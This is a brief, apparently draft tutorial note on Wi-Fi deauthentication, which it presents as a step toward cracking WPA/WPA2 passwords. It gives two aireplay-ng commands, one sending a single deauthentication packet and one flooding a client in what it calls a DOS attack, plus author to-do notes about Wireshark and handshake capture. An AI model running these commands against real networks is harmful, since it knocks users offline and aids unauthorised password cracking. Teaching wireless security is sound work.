Deauthentication is the act of pushing a machine off of an access point.
This comes in handy when password cracking an access point that has the 
WPA/WPA2 encryption. When a machine wants to connect to an access point
it will send a request packet. Then the access point will send a response
packet accepting/rejecting the machine. 

Deauthentication occurs in two steps:

1) <ins>Sending a deauthentication packet to the client</ins>
sudo aireplay-ng -0 1 -a <MAC ADDRESS AP> -c <CLIENT MAC ADDRESS> <interface>

2) <ins>performing DOS attack to the client</ins>
sudo aireplay-ng -0 0 -a <AP MAC ADDRESS> -c <CLIENT MAC ADDRESS> <interface>


**Notes**
May have to show what the packet looks like in wireshark
May need to explain other packets that machine and AP use to communicate with one another

Show what the terminal looks like when aireplay 
captures the 4way handshake
